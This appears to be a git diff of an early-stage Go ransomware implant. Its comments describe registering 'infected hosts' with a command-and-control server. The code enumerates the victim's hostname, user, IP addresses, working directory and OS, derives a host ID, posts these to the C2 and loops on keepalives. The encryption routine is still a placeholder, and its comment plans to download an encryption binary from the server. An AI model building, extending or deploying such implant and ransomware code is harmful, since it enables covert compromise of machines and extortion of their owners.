@@ -1,26 +1,28 @@
-//At some stage I will want this as its own binary, init() will be main()
 package main
 
 import (
 	"bytes"
+	"crypto/sha1"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
-	"math/rand"
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
-	"strconv"
+	"strings"
 	"time"
 )
 
 type Enumeration struct {
-	ID       int      `json:"ID"`
+	ID       string   `json:"ID"`
 	Hostname string   `json:"Hostname"`
 	User     string   `json:"User"`
 	IP       []string `json:"IP"`
+	Pwd      string   `json:"Pwd"`
+	OS       string   `json:"OS"`
 }
 
 var Discovery Enumeration
@@ -29,11 +31,13 @@ var Discovery Enumeration
 func main() {
 	//test webserver is up and running
 	resp, err := http.Get("http://localhost:8080/")
+
 	if err != nil {
 		panic(err)
 	}
+	defer resp.Body.Close()
 
-	if resp.StatusCode == 404 {
+	if resp.StatusCode > 400 {
 		//wait for web server to be running
 		for x := 1; x < 100; x++ { //TODO: change to while loop
 			time.Sleep(time.Minute)
@@ -43,27 +47,22 @@ func main() {
 			} else {
 				break
 			}
+
 		}
 	}
 
 	if resp != nil {
 		//run Enumeration function and communicate this to C2
-		Enumeration := Enumerate()
-		RegisterHost(Enumeration)
+		Enumeration, userString := Enumerate()
+		RegisterHost(Enumeration, userString)
 	}
 	//TODO: There should be something here
+
 }
 
 //Identifies a new infected host and registers it on the C2
-func RegisterHost(Enumeration Enumeration) {
+func RegisterHost(Enumeration Enumeration, userString string) {
 	postBody := Enumeration
-
-	//register an ID
-	s1 := rand.NewSource(time.Now().UnixNano())
-	r1 := rand.New(s1)
-	ID := r1.Intn(999999)
-	postBody.ID = ID
-	userString := strconv.Itoa(ID)
 
 	//convert struct to JSON
 	var buf bytes.Buffer
@@ -86,14 +85,13 @@ func RegisterHost(Enumeration Enumeration) {
 	if err != nil {
 		log.Fatal(err)
 	}
-
+	//TODO: Change this to response = 'WAIT', run the function again.
 	if resp.StatusCode == 200 {
 		for x := 1; x < 100; x++ { //TODO: change this to infinite loop after testing
 			err := KeepAlive(userString)
 			if err != nil {
 				log.Fatalf("Can't reach server, error = %s", err)
 				time.Sleep(time.Minute * 10)
-				continue
 			} else {
 				break
 			}
@@ -138,7 +136,7 @@ func KeepAlive(userString string) error {
 }
 
 //Enumerates host machine, listens for command from C2
-func Enumerate() Enumeration {
+func Enumerate() (Discovery Enumeration, userString string) {
 	//https://hack.technoherder.com/linux-host-enumeration/
 
 	//Get hostname
@@ -161,6 +159,26 @@ func Enumerate() Enumeration {
 
 	}
 
+	//get pwd
+	pwd, err := os.Getwd()
+	if err != nil {
+		Discovery.Pwd = "Error getting pwd"
+	}
+	Discovery.Pwd = pwd
+
+	//get OS and version
+	//TODO: Make this compatible with Windows
+	//https://github.com/matishsiao/goInfo
+	cmd := exec.Command("uname", "-sr")
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	err = cmd.Run()
+	if err != nil {
+		Discovery.OS = err.Error()
+	} else {
+		Discovery.OS = out.String()
+	}
+
 	//Get local IP address
 	var addresses []string
 	addrs, err := net.InterfaceAddrs()
@@ -174,12 +192,22 @@ func Enumerate() Enumeration {
 		Discovery.IP = addresses
 	}
 
-	return Discovery
+	//register an ID
+	// ID = hash of OS + Kernal + hostname
+	ID := strings.TrimSuffix(out.String(), "\n") + " " + Hostname
+	hash := sha1.Sum([]byte(ID))
+
+	ID = fmt.Sprintf("%x", hash)
+	userString = ID
+	Discovery.ID = ID
+
+	return Discovery, userString
 }
 
-//recursively find files and encrypt with goroutine
+//trigger key creation serverside and download the encryption binary from /file
 func Encrypt() {
 	//placeholder code
 	fmt.Println("I would start encrypting")
+	time.Sleep(time.Second * 10)
 	os.Exit(1)
 }
